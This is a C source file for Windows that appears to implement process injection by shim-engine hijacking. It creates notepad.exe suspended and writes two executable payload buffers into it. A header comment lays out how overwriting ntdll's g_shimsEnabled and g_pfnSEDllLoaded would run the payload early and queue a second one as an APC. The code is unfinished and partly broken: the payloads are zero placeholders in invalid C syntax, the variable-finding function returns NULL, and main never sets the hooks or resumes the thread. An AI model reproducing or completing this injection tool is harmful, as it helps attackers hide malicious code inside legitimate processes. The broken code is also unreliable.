#include <windows.h>
#include <stdio.h>

/*
    - Create a child process as suspended
    - Write payloads into the child process memory (two parts)
    - locate in ntdll.dll : g_shimsEnabled (.data) + g_pfnSEDllLoaded (.mrdata)
    - Set g_shimsEnabled to 1 and g_pfnSEDllLoaded @ Payload_1
    - Resume the child process 
    - First paylod detonated by ntdll!LdrpSendPostSnapNotification
    * - First payload sets g_ShimsEnabled to 0 and register the second payload as queued APC
    - Second payload detonated by ntdll.dll!NtTestAlert that empty the APC queue

*/

const UCHAR PAYLOAD_1[] = 0x00;
const size_t PAYLOAD_1_LEN = 0x00;
const UCHAR PAYLOAD_2[] = 0x00;
const size_t PAYLOAD_2_LEN = 0x00;

BOOL CreateChildProc(LPCWSTR targetPath, PROCESS_INFORMATION* pi) {
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    
    ZeroMemory(pi, sizeof(PROCESS_INFORMATION));

    BOOL status = CreateProcessW(
        targetPath,
        NULL,               
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,   // Creation flags
        NULL,
        NULL,
        &si,                // Pointer to STARTUPINFO
        pi                  // Pointer to PROCESS_INFORMATION
    );

    if (!status) {
        printf("[-] CreateProcessW failed. Error: %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

VOID FindShimsvariables(HANDLE hProcess, LPVOID* g_shimsEnabled, LPVOID* g_pfnSEDllLoaded) {
    *g_shimsEnabled = NULL;
    *g_pfnSEDllLoaded = NULL;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    
    // Memory bounds for sections
    PBYTE textBase = NULL, dataBase = NULL, mrdataBase = NULL;
    DWORD textSize = 0, dataSize = 0, mrdataSize = 0;

    // 1. Parse PE headers and locate required sections
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        // IMAGE_SECTION_HEADER.Name is an 8-byte UTF-8 array, not strictly null-terminated
        if (strncmp((char*)section[i].Name, ".text", 8) == 0) {
            textBase = (PBYTE)hNtdll + section[i].VirtualAddress;
            textSize = section[i].Misc.VirtualSize;
        } 
        else if (strncmp((char*)section[i].Name, ".data", 8) == 0) {
            dataBase = (PBYTE)hNtdll + section[i].VirtualAddress;
            dataSize = section[i].Misc.VirtualSize;
        }
        else if (strncmp((char*)section[i].Name, ".mrdata", 8) == 0) {
            mrdataBase = (PBYTE)hNtdll + section[i].VirtualAddress;
            mrdataSize = section[i].Misc.VirtualSize;
        }
    }

    if (!textBase || !dataBase || !mrdataBase) {
        printf("[-] Failed to locate required sections (.text, .data, .mrdata)\n");
        return;
    }


    *g_shimsEnabled = NULL;
    *g_pfnSEDllLoaded = NULL;
}

int main(int argc, char** argv) {
    PROCESS_INFORMATION pi;

    if (CreateChildProc(L"C:\\Windows\\System32\\notepad.exe", &pi)) {
        printf("[+] Child process created successfully.\n");
    } else {
        printf("[-] Failed to create child process.\n");
        return 1;
    }
    
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;
    DWORD dwProcessId = pi.dwProcessId;

    LPVOID pPayload1 = VirtualAllocEx(hProcess, NULL, PAYLOAD_1_LEN, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    LPVOID pPayload2 = VirtualAllocEx(hProcess, NULL, PAYLOAD_2_LEN, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!pPayload1 || !pPayload2) { 
        printf("[-] VirtualAllocEx failed. Error: %lu\n", GetLastError());
        return 1;
    }

    WriteProcessMemory(hProcess, pPayload1, PAYLOAD_1, PAYLOAD_1_LEN, NULL);
    WriteProcessMemory(hProcess, pPayload2, PAYLOAD_2, PAYLOAD_2_LEN, NULL);

    VirtualProtectEx(hProcess, pPayload1, PAYLOAD_1_LEN, PAGE_EXECUTE_READ, NULL);
    VirtualProtectEx(hProcess, pPayload2, PAYLOAD_2_LEN, PAGE_EXECUTE_READ, NULL);

    






    return 0;
}